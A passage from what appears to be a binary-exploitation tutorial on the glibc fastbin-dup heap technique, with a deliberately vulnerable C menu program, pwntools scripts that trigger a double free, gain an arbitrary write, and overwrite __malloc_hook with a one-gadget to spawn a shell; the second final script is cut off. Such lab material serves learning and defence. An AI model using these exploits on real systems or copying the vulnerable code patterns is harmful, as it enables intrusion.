<p>To achieve the <code class="language-plaintext highlighter-rouge">fastbin dup</code> we have to overwrite a the forward (<code class="language-plaintext highlighter-rouge">fd</code>) pointer, of a chunk in the <code class="language-plaintext highlighter-rouge">fastbin</code> using a double free or use-after-free ( double-free in this case). If we can overwrite <code class="language-plaintext highlighter-rouge">fd</code> pointer, we can trick the allocator to return a pointer out target location the next time we allocate another chunk.</p>

<p>Lets trigger the double-free vulnerability</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="nf">malloc</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="c1"># 0
</span><span class="nf">malloc</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="c1"># 1
</span>
<span class="nf">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="nf">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="nf">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>we had to free another chunk between the double free in order to bypass the <code class="language-plaintext highlighter-rouge">double free or corruption (fasttop)</code> mitigation.</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">old</span> <span class="o">==</span> <span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"double free or corruption (fasttop)"</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Now lets look at the <code class="language-plaintext highlighter-rouge">fastbin</code></p>

<p><a href="/assets/images/pwn/fastbin_dup/fastbin.png" class="popup img-link shimmer"><img src="/assets/images/pwn/fastbin_dup/fastbin.png" alt="Fastbin 1" loading="lazy"></a></p>

<p>The bin goes like this <code class="language-plaintext highlighter-rouge">0x804b008 -&gt; 0x804b020 -&gt;  0x804b008</code>. The chunk <code class="language-plaintext highlighter-rouge">0x804b008</code> is placed twice in the <code class="language-plaintext highlighter-rouge">fastbin</code></p>

<p>Now we have to return <code class="language-plaintext highlighter-rouge">0x804b008</code> and overwrite the <code class="language-plaintext highlighter-rouge">fd</code> pointer with out target location. then allocate 2 chunks.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="nf">malloc</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="c1"># 2 | 0 
</span><span class="nf">get_data</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">p32</span><span class="p">(</span><span class="n">target</span><span class="o">-</span><span class="mi">8</span><span class="p">))</span>

<span class="nf">malloc</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="c1"># 3 | 1
</span><span class="nf">malloc</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="c1"># 4 | 0 (again)
</span></pre></td></tr></tbody></table></code></div></div>

<p>I subtracted <code class="language-plaintext highlighter-rouge">8</code> from the target address because <code class="language-plaintext highlighter-rouge">malloc</code> treats chunks as starting 8 bytes before their user data in 32-bit and 16 bytes in  64 bit binaries</p>

<p>Now lets look at the <code class="language-plaintext highlighter-rouge">fastbin</code></p>

<p><a href="/assets/images/pwn/fastbin_dup/fastbin2.png" class="popup img-link shimmer"><img src="/assets/images/pwn/fastbin_dup/fastbin2.png" alt="Fastbin2" loading="lazy"></a></p>

<p>we can see that the chunk in the <code class="language-plaintext highlighter-rouge">fastbin</code> now points to our target <code class="language-plaintext highlighter-rouge">0x804a0a8</code> which is the <code class="language-plaintext highlighter-rouge">struct targets</code> + 8.  The next allocation will be our target location, which provides a arbitrary write.</p>

<blockquote>
  <p>Note
You have to setup metadata for your chunk in order for the technique to work. In this case the username field is used.</p>
</blockquote>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nf">malloc</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="c1"># 5 | this is our target location
</span><span class="nf">get_data</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">admin</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>We now wrote <code class="language-plaintext highlighter-rouge">admin</code> to our target.</p>

<p>Final Exploit</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
</pre></td><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">:</span><span class="nb">int</span><span class="p">):</span>
	<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">calling malloc ...</span><span class="sh">"</span><span class="p">)</span>
	<span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">&gt; </span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
	<span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Enter size: </span><span class="sh">"</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">size</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
	
<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">:</span><span class="nb">int</span><span class="p">):</span>
	<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">calling free ...</span><span class="sh">"</span><span class="p">)</span>
	<span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">&gt; </span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
	<span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Enter Index: </span><span class="sh">"</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
	
<span class="k">def</span> <span class="nf">get_data</span><span class="p">(</span><span class="n">index</span><span class="p">:</span><span class="nb">int</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span><span class="nb">bytes</span><span class="p">):</span>
	<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">calling scanf ...</span><span class="sh">"</span><span class="p">)</span>
	<span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">&gt; </span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">)</span>
	<span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Enter Index: </span><span class="sh">"</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
	<span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Enter data: </span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
	
<span class="k">def</span> <span class="nf">check</span><span class="p">():</span>
	<span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">&gt; </span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
	<span class="c1">##################################################################### 
</span>	<span class="c1">######################## EXPLOIT CODE ###############################
</span>	<span class="c1">#####################################################################
</span>
	<span class="nf">ru</span><span class="p">(</span><span class="sh">"</span><span class="s">Target = </span><span class="sh">"</span><span class="p">)</span>
	<span class="n">target</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">rl</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
	<span class="nf">print_leak</span><span class="p">(</span><span class="sh">"</span><span class="s">Target </span><span class="sh">"</span><span class="p">,</span> <span class="n">target</span><span class="p">)</span>


	<span class="n">metadata</span> <span class="o">=</span> <span class="nf">flat</span><span class="p">(</span>
		<span class="nf">p32</span><span class="p">(</span><span class="mh">0x18</span><span class="p">),</span>
		<span class="nf">p32</span><span class="p">(</span><span class="mh">0x19</span><span class="p">)</span>
	<span class="p">)</span>

	<span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Metadata: </span><span class="sh">"</span><span class="p">,</span> <span class="n">metadata</span><span class="p">)</span>


	<span class="nf">malloc</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="c1"># 0
</span>	<span class="nf">malloc</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="c1"># 1
</span>
	<span class="nf">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
	<span class="nf">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
	<span class="nf">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

	<span class="nf">malloc</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="c1"># 2 | 0 
</span>	<span class="nf">malloc</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="c1"># 3 | 1
</span>
	<span class="nf">get_data</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">p32</span><span class="p">(</span><span class="n">target</span><span class="o">-</span><span class="mi">8</span><span class="p">))</span>
	<span class="nf">malloc</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="c1"># 4 | 0 (again)
</span>	<span class="nf">malloc</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="c1"># 5
</span>	<span class="nf">check</span><span class="p">()</span>
	<span class="nf">get_data</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">admin</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>

	<span class="nf">check</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Results</p>

<p><a href="/assets/images/pwn/fastbin_dup/write.png" class="popup img-link shimmer"><img src="/assets/images/pwn/fastbin_dup/write.png" alt="Arbitrary Write" loading="lazy"></a></p>

<p>Was able to perform the arbitrary write.</p>

<h4 id="code-execution"><span class="me-2">Code Execution</span><a href="#code-execution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>target <code class="language-plaintext highlighter-rouge">__free_hook</code> of <code class="language-plaintext highlighter-rouge">__malloc_hook</code> and set up a one-gadget</p>

<h5 id="example-1"><span class="me-2">Example</span><a href="#example-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5>

<p>This is just like the previous example except that our target memory location is now the <code class="language-plaintext highlighter-rouge">_-free_hook</code> or <code class="language-plaintext highlighter-rouge">__malloc_hook</code></p>

<p>Vulnerable code</p>

<p>This example is done on <code class="language-plaintext highlighter-rouge">glibc 2.23</code></p>

<div class="language-sh highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>pwn@90782eb49a00:~/workspace<span class="nv">$ </span>/lib/x86_64-linux-gnu/libc.so.6 
GNU C Library <span class="o">(</span>Ubuntu GLIBC 2.23-0ubuntu11.3<span class="o">)</span> stable release version 2.23, by Roland McGrath et al.
Copyright <span class="o">(</span>C<span class="o">)</span> 2016 Free Software Foundation, Inc.
This is free software<span class="p">;</span> see the <span class="nb">source </span><span class="k">for </span>copying conditions.
There is NO warranty<span class="p">;</span> not even <span class="k">for </span>MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 5.4.0 20160609.
Available extensions:
	crypt add-on version 2.1 by Michael Glad and others
	GNU Libidn by Simon Josefsson
	Native POSIX Threads Library by Ulrich Drepper et al
	BIND-8.2.3-T5B
libc ABIs: UNIQUE IFUNC
For bug reporting instructions, please see:
&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.

</pre></td></tr></tbody></table></code></div></div>

<p>In modern <code class="language-plaintext highlighter-rouge">glibc</code> you would need to fill in the <code class="language-plaintext highlighter-rouge">tcache</code> bins first.</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span>
<span class="kt">char</span> <span class="o">*</span><span class="n">ptrs</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
<span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">allocate</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Enter size: "</span><span class="p">);</span>
        <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
        <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
        <span class="n">ptrs</span><span class="p">[</span><span class="n">count</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
        <span class="n">count</span><span class="o">++</span><span class="p">;</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="nf">deallocate</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Enter Index: "</span><span class="p">);</span>
        <span class="kt">int</span> <span class="n">index</span><span class="p">;</span>
        <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">index</span><span class="p">);</span>
        <span class="n">free</span><span class="p">(</span><span class="n">ptrs</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>
<span class="p">}</span>


<span class="kt">void</span> <span class="nf">get_data</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Enter Index: "</span><span class="p">);</span>
        <span class="kt">int</span> <span class="n">index</span><span class="p">;</span>
        <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">index</span><span class="p">);</span>
        
        <span class="n">printf</span><span class="p">(</span><span class="s">"Enter data: "</span><span class="p">);</span>
        <span class="c1">//fgets(ptrs[index], 64, stdin);</span>
        <span class="n">scanf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">ptrs</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">menu</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"1. malloc"</span><span class="p">);</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"2. free"</span><span class="p">);</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"3. scanf"</span><span class="p">);</span>
<span class="p">}</span>


<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>

        <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
        <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"leak = %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">printf</span><span class="p">);</span>

        <span class="kt">int</span> <span class="n">choice</span><span class="p">;</span>
        <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">menu</span><span class="p">();</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">);</span>
                <span class="n">scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">choice</span><span class="p">);</span>
                <span class="k">switch</span> <span class="p">(</span><span class="n">choice</span><span class="p">)</span> <span class="p">{</span>
                        <span class="k">case</span> <span class="mi">1</span><span class="p">:</span>
                                <span class="n">allocate</span><span class="p">();</span>
                                <span class="k">break</span><span class="p">;</span>
                        <span class="k">case</span> <span class="mi">2</span><span class="p">:</span> 
                                <span class="n">deallocate</span><span class="p">();</span>
                                <span class="k">break</span><span class="p">;</span>
                        <span class="k">case</span> <span class="mi">3</span><span class="p">:</span>
                                <span class="n">get_data</span><span class="p">();</span>
                                <span class="k">break</span><span class="p">;</span>
                        <span class="nl">default:</span>
                                <span class="n">puts</span><span class="p">(</span><span class="s">"Invalid Choice"</span><span class="p">);</span>
                <span class="p">}</span>       
        <span class="p">}</span>

        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The application has 3 main functions</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">allocate()</code>
    <ul>
      <li>get size from user and allocate a <code class="language-plaintext highlighter-rouge">malloc</code> a chunk of that size.</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">deallocate()</code>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">free</code> a chunk</li>
    </ul>
  </li>
  <li><code class="language-plaintext highlighter-rouge">get_data()</code>
    <ul>
      <li>Enter data in a specific chunk</li>
    </ul>
  </li>
</ol>

<h6 id="exploitation-2">Exploitation</h6>

<p>Lets trigger the double-free vulnerability</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="nf">malloc</span><span class="p">(</span><span class="mi">92</span><span class="p">)</span> <span class="c1"># 0
</span><span class="nf">malloc</span><span class="p">(</span><span class="mi">92</span><span class="p">)</span> <span class="c1"># 1
</span>
<span class="nf">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="nf">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="nf">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Lets view the fast bins</p>

<p><a href="/assets/images/pwn/fastbin_dup/cfastbin1.png" class="popup img-link shimmer"><img src="/assets/images/pwn/fastbin_dup/cfastbin1.png" alt="Arbitrary Write" loading="lazy"></a></p>

<p>The chunk <code class="language-plaintext highlighter-rouge">0x602080</code> appears twice in the <code class="language-plaintext highlighter-rouge">fastbin</code>.</p>

<p>The next call to <code class="language-plaintext highlighter-rouge">malloc</code> of the size <code class="language-plaintext highlighter-rouge">92</code> will return the <code class="language-plaintext highlighter-rouge">0x602080</code> chunk which we will use to overwrite the <code class="language-plaintext highlighter-rouge">fd</code> pointer of the chunk <code class="language-plaintext highlighter-rouge">0x602080</code> that is still in the <code class="language-plaintext highlighter-rouge">fastbin</code>.</p>

<p>But do we overwrite the <code class="language-plaintext highlighter-rouge">fd</code> with?</p>

<p>Our target here will be the <code class="language-plaintext highlighter-rouge">__malloc_hook</code>, but we need to remember that our target has to have the correct metadata (size field) to get pass the size check <code class="language-plaintext highlighter-rouge">malloc(): memory corruption (fast)</code> mitigation.</p>

<p>Lets take a look at <code class="language-plaintext highlighter-rouge">__malloc_hook</code></p>

<p><a href="/assets/images/pwn/fastbin_dup/malloc_hook.png" class="popup img-link shimmer"><img src="/assets/images/pwn/fastbin_dup/malloc_hook.png" alt="Arbitrary Write" loading="lazy"></a></p>

<p><code class="language-plaintext highlighter-rouge">__malloc_hook</code> is at <code class="language-plaintext highlighter-rouge">0x7ffff7bc4b10</code> but we can see that the previous word is a large number which won’t pass the size check. So we need to look near <code class="language-plaintext highlighter-rouge">__malloc_hook</code> where we can place our data</p>

<p>Lets look at <code class="language-plaintext highlighter-rouge">__malloc_hook</code> - 35</p>

<p><a href="/assets/images/pwn/fastbin_dup/malloc_hook35.png" class="popup img-link shimmer"><img src="/assets/images/pwn/fastbin_dup/malloc_hook35.png" alt="Arbitrary Write" loading="lazy"></a></p>

<p>We can see that at the address <code class="language-plaintext highlighter-rouge">0x7ffff7bc4af5</code> there is <code class="language-plaintext highlighter-rouge">0x7f</code> which is perfect for use can it will pass the <code class="language-plaintext highlighter-rouge">fastbin</code> size field check.</p>

<p>So now we have to allocate</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="nf">malloc</span><span class="p">(</span><span class="mi">92</span><span class="p">)</span> <span class="c1"># 2 | 0 
</span><span class="n">target</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">__malloc_hook</span><span class="sh">'</span><span class="p">]</span> <span class="o">-</span> <span class="mi">35</span>
<span class="nf">get_data</span><span class="p">(</span><span class="mi">0</span> <span class="p">,</span><span class="nf">p64</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>

<span class="nf">malloc</span><span class="p">(</span><span class="mi">92</span><span class="p">)</span> <span class="c1"># 3 | 1
</span><span class="nf">malloc</span><span class="p">(</span><span class="mi">92</span><span class="p">)</span> <span class="c1"># 4 | 0 (again)
</span></pre></td></tr></tbody></table></code></div></div>

<p>The next call to <code class="language-plaintext highlighter-rouge">malloc</code> we return our target memory location.</p>

<p>First find a one gadget.</p>

<p><a href="/assets/images/pwn/fastbin_dup/one_gadget.png" class="popup img-link shimmer"><img src="/assets/images/pwn/fastbin_dup/one_gadget.png" alt="Arbitrary Write" loading="lazy"></a></p>

<p>I will use <code class="language-plaintext highlighter-rouge">0xf1247</code>.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="nf">malloc</span><span class="p">(</span><span class="mi">92</span><span class="p">)</span>
<span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xf1247</span>
<span class="n">payload</span> <span class="o">=</span> <span class="nf">flat</span><span class="p">(</span>
	<span class="nf">cyclic</span><span class="p">(</span><span class="mh">0x13</span><span class="p">),</span> <span class="c1"># padding to __malloc_hook  
</span>	<span class="n">one_gadget</span>
<span class="p">)</span>
<span class="nf">get_data</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The next call to <code class="language-plaintext highlighter-rouge">malloc</code> will pop a shell</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nf">malloc</span><span class="p">(</span><span class="mi">92</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Final exploit</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
</pre></td><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">:</span><span class="nb">int</span><span class="p">):</span>
	<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">calling malloc ...</span><span class="sh">"</span><span class="p">)</span>
	<span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">&gt; </span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
	<span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Enter size: </span><span class="sh">"</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">size</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
	
<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">:</span><span class="nb">int</span><span class="p">):</span>
	<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">calling free ...</span><span class="sh">"</span><span class="p">)</span>
	<span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">&gt; </span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
	<span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Enter Index: </span><span class="sh">"</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
	
<span class="k">def</span> <span class="nf">get_data</span><span class="p">(</span><span class="n">index</span><span class="p">:</span><span class="nb">int</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span><span class="nb">bytes</span><span class="p">):</span>
	<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">calling scanf ...</span><span class="sh">"</span><span class="p">)</span>
	<span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">&gt; </span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">)</span>
	<span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Enter Index: </span><span class="sh">"</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">index</span><span class="p">).</span><span class="nf">encode</span><span class="p">())</span>
	<span class="nf">sla</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Enter data: </span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
	
<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
	<span class="c1">##################################################################### 
</span>	<span class="c1">######################## EXPLOIT CODE ###############################
</span>	<span class="c1">#####################################################################
</span>
